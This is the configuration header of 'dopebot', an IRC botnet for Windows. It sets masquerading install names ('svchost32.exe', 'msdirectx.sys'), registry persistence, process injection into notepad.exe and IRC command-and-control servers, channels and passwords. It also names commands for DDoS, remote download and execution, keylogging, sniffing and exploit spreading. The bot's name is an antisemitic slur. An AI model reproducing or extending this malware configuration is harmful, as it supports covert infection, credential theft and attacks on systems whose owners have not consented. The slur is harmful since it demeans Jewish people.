/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

//Serverlist Struct
typedef struct serverlist
{
	char *server;
	int port;
} serverlist;
/*-------------------------------------------------------------------------------*/
//Non Crypted Config
#ifdef NO_CRYPTO
//Non Crypted Settings
//Bot Settings
	const char *botname = "jew";
	const char *botversion = "dopebot 0.2 by dope.";
	const char *prefix = ".";
	const char *version = "mIRC v6.14 Khaled Mardam-Bey";
	const int maxrand = 3;
	const bool uptimenick = TRUE;
//Daemon Settings
	const char *ftpduser = "dopebot";
	const char *ftpdpass = "dopebot";
	const int ftpdport = 21;
	const int tftpdport = 69;
//Install Settings
	const char *filename = "svchost32.exe";
	const char *regkeyname = "svchost32";
	const char *servicename = "svchost32";
	const bool useregistry = TRUE;
	const bool useservice = FALSE;
//IRC Settings
	serverlist servers[] =
	{
		{"127.0.0.1", 6667},
		{"irc.dal.net", 6667},
		{NULL, 0}
	};
	const char *serverpassword = "d0pe";
	const char *channel = "#dopebot";
	const char *channelpassword = "pwn";
	const bool useoschannel = FALSE;
//Security Settings
	const char *botpassword = "hi";
	const char *hostauth[] =
	{
		"dope!",
		"\0"
	};
	const char *teakey = "jbegtnab";
	const int xorkey = 3;
//Sniffer Settings
	const char *snifferchannel = "#dopebot-sniffer";
//Spreader Settings
	const char *exploitchannel = "#dopebot-exploits";
//Stealth Settings
	const char *driverfilename = "msdirectx.sys";
	const char *drivername = "msdirectx";
	const char *hookfilename = "msdirectx.dll";
	const char *injectprocess = "notepad.exe";
	const int ircport = 6667; //Used with regport()
/*-------------------------------------------------------------------------------*/
//Non Crypted Commands
//Bot Command Names
	const char *cmd_botgroup = "bot"; //Name Of Bot Command Group
////
	const char *cmd_botdisconnect = "bot.disconnect"; //Name Of Bot Disconnect Command
	const char *cmd_botinfo = "bot.info"; //Name Of Bot Info Command
	const char *cmd_botlog = "bot.log"; //Name Of Bot Log Command
	const char *cmd_botlogin = "bot.login"; //Name Of Bot Login Command
	const char *cmd_botlogout = "bot.logout"; //Name Of Bot Logout Command
	const char *cmd_botnetinfo = "bot.netinfo"; //Name Of Bot Network Info Command
	const char *cmd_botraw = "bot.raw"; //Name Of Bot RAW Command
	const char *cmd_botremove = "bot.remove"; //Name Of Bot Remove Command
	const char *cmd_botsysinfo = "bot.sysinfo"; //Name Of Bot System Info Command
//DDOS Command Names
	const char *cmd_ddosgroup = "ddos"; //Name Of DDOS Command Group
////
	const char *cmd_ddosbandwith = "ddos.bandwith"; //Name Of DDOS Bandwith Command
//Download Command Names
	const char *cmd_downloadgroup = "download"; //Name Of Download Command Group
////
	const char *cmd_downloadhttp = "download.http"; //Name Of Download HTTP Command
	const char *cmd_downloadupdate = "download.update"; //Name Of Download Update Command
//File Command Names
	const char *cmd_filegroup = "file"; //Name Of File Command Group
////
	const char *cmd_filedelete = "file.delete"; //Name Of File Delete Command
	const char *cmd_fileexecute = "file.execute"; //Name Of File Execute Command
	const char *cmd_fileopen = "file.open"; //Name Of File Open Command
//Keylogger Command Names
	const char *cmd_keyloggroup = "keylog"; //Name Of KeyLog Command Group
////
	const char *cmd_keylogstart = "keylog.start"; //Name Of KeyLog Start Command
	const char *cmd_keylogstop = "keylog.stop"; //Name Of KeyLog Stop Command
//Process Command Names
	const char *cmd_processgroup = "process"; //Name Of Process Command Group
////
	const char *cmd_processlist = "process.list"; //Name Of Process List Command
	const char *cmd_processkill = "process.kill"; //Name Of Process Kill Command
//Scan Command Names
	const char *cmd_scangroup = "scan"; //Name Of Scan Command Group
////
	const char *cmd_scancip = "scan.cip"; //Name Of Scan CIP Command
	const char *cmd_scanstart = "scan.start";//Name Of Scan Start Command
	const char *cmd_scanstop = "scan.stop"; //Name Of Scan Stop Command
//Sniffer Command Names
	const char *cmd_sniffgroup = "sniff"; //Name Of Sniff Command Group
////
	const char *cmd_snifferstart = "sniff.start"; //Name Of Sniffer Start Command
	const char *cmd_snifferstop = "sniff.stop"; //Name Of Sniffer Stop Command
#endif
/*-------------------------------------------------------------------------------*/

/*
		.=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-.
		|                     ______                     |
		|                  .-"      "-.                  |
		|                 /            \                 |
		|     _          |              |          _     |
		|    ( \         |,  .-.  .-.  ,|         / )    |
		|     > "=._     | )(__/  \__)( |     _.=" <     |
		|    (_/"=._"=._ |/     /\     \| _.="_.="\_)    |
		|           "=._"(_     ^^     _)"_.="           |
		|               "=\__|IIIIII|__/="               |
		|              _.="| \IIIIII/ |"=._              |
		|    _     _.="_.="\          /"=._"=._     _    |
		|   ( \_.="_.="     `--------`     "=._"=._/ )   |
		|    > _.="                            "=._ <    |
		|   (_/                                    \_)   |
		|                                                |
		'-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
*/
